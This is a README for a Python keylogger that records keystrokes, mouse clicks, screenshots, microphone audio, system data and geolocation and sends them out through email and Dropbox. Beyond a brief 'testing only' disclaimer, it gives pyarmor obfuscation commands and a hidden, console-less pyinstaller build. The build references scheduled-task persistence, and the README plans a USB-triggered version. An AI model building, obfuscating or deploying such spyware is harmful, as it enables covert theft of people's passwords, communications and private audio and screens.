# KeyLogger - Monitoring and Reporting Program

## Program Description
This program is a KeyLogger designed to collect input data from the keyboard and mouse, capture screenshots and audio from the microphone, and send these reports via email and Dropbox integration. **Use this tool exclusively for testing purposes and in authorized environments**.

## Features
The program performs the following tasks:
- Collects system data (hostname, IP address, processor, OS, machine architecture).
- Detects geographic location.
- Monitors keyboard strokes and mouse clicks.
- Captures screenshots and audio at regular intervals.
- Sends collected data via email and Dropbox.
- Automatically deletes temporary files to preserve data privacy.

## Prerequisites
Python 3 and the following packages are required:
- `dotenv`
- `dropbox`
- `geocoder`
- `mss`
- `numpy`
- `poolmanager`
- `psutil`
- `pyinstaller`
- `pynput`
- `requests`
- `sounddevice`

### Dependency Installation
To install all required packages, run:
```bash
pip install -r requirements.txt
```

## Configuration
1. **Email Configuration**: Define the SMTP server details in a .env file to enable log reporting via email.
2. **Dropbox Integration**: Create a Dropbox API token and add it to the .env file to enable Dropbox integration.
3. **Environment Variables**:
    * Set up a .env file with the following variables:
    ```plaintext
    SMTP_SERVER=<your_smtp_server>
    SMTP_PORT=<your_smtp_port>
    EMAIL_ADDRESS=<your_email_address>
    EMAIL_PASSWORD=<your_email_password>
    EMAIL_SENDER=<sender_email>
    EMAIL_RECEIVER=<receiver_email>
    EMAIL_CC=<cc_email>
    DROPBOX_TOKEN=<your_dropbox_token>
    ```
4. **Report Interval**: Define the time interval (SEND_REPORT_EVERY) in seconds for reporting frequency.
5. **Magic Word**: Set the MAGIC_WORD variable to define the word that stops the KeyLogger when typed.

## Program Structure

### KeyLogger Class
* **System Information**: Collects data on hostname, IP address, processor, OS, and machine architecture.
* **Geolocation**: Detects the geographic location of the system.
* **Keyboard Monitoring**: Tracks keyboard input.
* **Mouse Monitoring**: Monitors clicks, capturing screenshots for each click (but omits movements and scrolls to limit log volume).
* **Audio Recording**: Records audio from the microphone at each interval.
* **Screenshot Capture**: Takes screenshots on each mouse click.
* **Report Generation**: Sends email reports with logged data and uploads images and audio files to Dropbox.
* **Cleanup**: Clears temporary data to ensure efficient resource usage.

## Execution
1. Create an instance of the <code>KeyLogger</code> class, initializing it with the required variables.
2. Call the <code>run</code> method to start the KeyLogger.
3. The program automatically deletes the <code>.env</code> file at runtime to secure sensitive information.
4. Typing the magic word (if defined) stops the KeyLogger.

## Single EXE File Version
To run this code on a machine without Python installed, you can compile it into a standalone executable using <code>pyinstaller</code>. The command below is included in the requirements file:
```bash
pyinstaller --onefile --add-data ".env;." main.py
```

## Commands to obfuscate and compile the program
To obfuscate and compile the program, run the following commands:
1. Install required packages:
    ```bash
    pip install -r requirements.txt
    ```
2. Obfuscate code files using <code>pyarmor</code>:
    ```bash
    pyarmor gen -O obfuscated_dist main.py
    pyarmor gen -O obfuscated_dist keylogger.py
    pyarmor gen -O obfuscated_dist utils.py
    ```
3. Generate an executable:
    ```bash
    pyinstaller --onefile --noconsole --add-data "obfuscated_dist\pyarmor_runtime_000000\pyarmor_runtime.pyd;." --hidden-import socket --hidden-import psutil --hidden-import requests --hidden-import subprocess --hidden-import dropbox --hidden-import geocoder --hidden-import mss --hidden-import os --hidden-import platform --hidden-import sounddevice --hidden-import ssl --hidden-import time --hidden-import wave --hidden-import pynput --hidden-import requests.adapters.HTTPAdapter --hidden-import shutil --hidden-import smtplib --hidden-import email.mime.multipart --hidden-import email.mime.text --hidden-import email.mime.base --hidden-import email.encoders --hidden-import keylogger --hidden-import utils --hidden-import utils.send_mail_with_attachment --hidden-import utils.get_wav_and_png_files --hidden-import utils.delete_wav_and_png_files --hidden-import utils.upload_to_dropbox --hidden-import utils.save_program_in_location --hidden-import utils.create_scheduled_task --hidden-import utils.is_process_running --hidden-import utils.stop_process --hidden-import string obfuscated_dist\main.py
    ```
4. Copy the <code>main.exe</code> file from the <code>dist</code> folder.

## Future Development
* Develop a USB-triggered version that runs when plugged into a PC.
* Implement Dropbox token renewal as the current token expires after four hours.
